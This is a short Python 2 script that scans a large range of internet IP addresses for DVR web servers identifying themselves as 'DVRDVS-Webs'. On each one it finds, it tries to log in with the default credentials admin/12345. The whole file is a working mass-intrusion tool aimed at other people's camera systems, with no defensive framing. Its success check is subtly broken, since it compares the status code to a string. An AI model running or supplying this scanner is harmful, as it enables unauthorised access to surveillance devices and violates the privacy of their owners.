# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
#http://200.119.19.214/
for i in range(199,256):
    i = i + 1
    c = str(i)
    for j in range(118,256):
        j = j + 1
        l=str(j)
        for p in range(10,256):
            p = p + 1
            m = str(p)
            for a in range(200,256):
                a = a + 1
                g = str(a)
                h = c + "." + l + "." + m + "." + g
                try:
                    
                    r = requests.get('http://'+str(h)+'/doc/page/paramconfig.asp', timeout=0.5)
                    head = r.headers
                    # /doc/page/main.asp
                    server = 'Server'
                    dvr = 'DVRDVS-Webs'
                    
                    ok = server in head
                    if ok:
                        
                        hu = r.headers['Server']
                        if hu == dvr:
                            print 'probando         '+h+'\n'+ str(head)
                            r = requests.get('http://'+str(h)+'/doc/page/paramconfig.asp', auth=HTTPBasicAuth('admin', '12345'), timeout=0.9)
                            if r.status_code=='200' :
                                
                                print 'login ok en dvr '+h
                    
                except:
                    pass
                